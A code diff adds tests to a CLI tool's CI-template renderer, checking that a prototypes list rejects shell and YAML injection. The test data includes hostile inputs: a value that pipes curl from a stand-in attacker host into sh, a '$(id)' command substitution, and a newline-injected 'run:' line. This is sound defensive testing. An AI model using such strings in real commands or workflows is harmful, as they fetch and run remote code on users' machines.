@@ -20,6 +20,7 @@ import {
   ciTemplatesRoot,
   contentSha256,
   driftStatus,
+  parsePrototypeList,
   parseTemplateHeader,
   parseWorkflowList,
   planCiInit,
@@ -51,6 +52,31 @@ describe('ci template rendering', () => {
     );
     expect(out).toBe('node=24 list=alpha-app,beta-app p=cloudflare\n');
     expect(() => renderTemplate('x={{MISSING}}', placeholders)).toThrow(CliError);
+  });
+
+  it('refuses a PROTOTYPES value that is not a slug list (shell or YAML injection)', () => {
+    for (const bad of [
+      "crm-demo'; curl https://evil.example | sh; '",
+      'a,b\n  run: x',
+      'a, b',
+      '$(id)',
+    ]) {
+      expect(
+        () => renderTemplate('list={{PROTOTYPES}}', { ...placeholders, PROTOTYPES: bad }),
+        bad
+      ).toThrow(CliError);
+    }
+    expect(renderTemplate('list={{PROTOTYPES}}', { ...placeholders, PROTOTYPES: '' })).toBe(
+      'list='
+    );
+  });
+
+  it('parses --prototypes against slug rules and the registry', () => {
+    expect(parsePrototypeList(' alpha-app , beta-app,alpha-app ')).toBe('alpha-app,beta-app');
+    expect(() => parsePrototypeList("crm-demo'; curl x")).toThrow(CliError);
+    expect(() => parsePrototypeList('alpha-app,ghost-app', new Set(['alpha-app']))).toThrow(
+      /ghost-app/
+    );
   });
 
   it('requires every uses: line to be a 40-char SHA pin', () => {
@@ -160,6 +186,27 @@ describe('protoyard ci init', () => {
     const content = readFileSync(path, 'utf8');
     expect(content).toContain('Protoyard check');
     expect(content).not.toContain('# stale');
+  });
+
+  it('rejects an injected or unknown --prototypes value before rendering anything', async () => {
+    ws = createWorkspace();
+    addPrototype(ws, 'alpha-app');
+    for (const value of ["alpha-app'; curl https://evil.example | sh; '", 'alpha-app,ghost-app']) {
+      const run = await cli([
+        '--root',
+        ws.root,
+        '--json',
+        'ci',
+        'init',
+        '--with',
+        'check',
+        '--prototypes',
+        value,
+        '--dry-run',
+      ]);
+      expect(run.code, value).toBe(2);
+    }
+    expect(existsSync(join(ws.root, '.github'))).toBe(false);
   });
 
   it('--dry-run prints paths and writes nothing', async () => {
